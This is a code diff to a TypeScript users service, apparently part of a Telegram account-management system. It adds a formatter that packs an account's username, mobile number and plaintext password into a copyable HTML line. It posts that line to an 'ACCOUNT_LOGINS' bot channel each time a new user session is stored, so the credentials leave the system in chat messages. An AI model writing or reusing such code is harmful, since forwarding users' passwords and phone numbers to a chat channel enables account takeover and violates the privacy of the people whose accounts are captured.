@@ -26,6 +26,16 @@ import { canonicalizeMobile } from '../shared/mobile-utils';
 import { getTelegramCommonChatIds } from '../../utils/telegram-utils/common-chats';
 import { BufferClientService } from '../buffer-clients/buffer-client.service';
 import { PromoteClientService } from '../promote-clients/promote-client.service';
+import { escapeTelegramHtml } from '../../utils/rich-message';
+
+/** One compact line: linked @username (or name) · tap-to-copy mobile · tap-to-copy password. */
+export function accountLoginHtml(user: { username?: string; firstName?: string; password?: string }, mobile: string): string {
+  const handle = user.username?.replace(/^@/, '');
+  const account = handle
+    ? `<a href="https://t.me/${encodeURIComponent(handle)}">@${escapeTelegramHtml(handle)}</a>`
+    : escapeTelegramHtml(user.firstName || 'Unknown');
+  return `🔐 ${account} · <code>${escapeTelegramHtml(mobile)}</code>${user.password ? ` · 🔑 <code>${escapeTelegramHtml(user.password)}</code>` : ''}`;
+}
 
 @Injectable()
 export class UsersService {
@@ -113,19 +123,7 @@ export class UsersService {
       this.logger.log(`Updating New Session Details: ${canonicalMobile}, @${userData.username}, ${activeClientSetup.clientId}`);
       await this.clientsService.updateClientSession(userData.session, canonicalMobile);
     } else {
-      await this.botsService.sendMessageByCategory(
-        ChannelCategory.ACCOUNT_LOGINS,
-        {
-          title: 'Account Login',
-          fields: [
-            { label: 'Account', value: userData.username ? `@${userData.username}` : userData.firstName },
-            { label: 'Mobile', value: canonicalMobile },
-            { label: 'Password', value: userData.password },
-          ],
-        },
-        undefined,
-        false
-      );
+      await this.botsService.sendHtmlByCategory(ChannelCategory.ACCOUNT_LOGINS, accountLoginHtml(userData, canonicalMobile));
       const newUser = new this.userModel(userData);
       const saved = await newUser.save();
       setTimeout(() => {
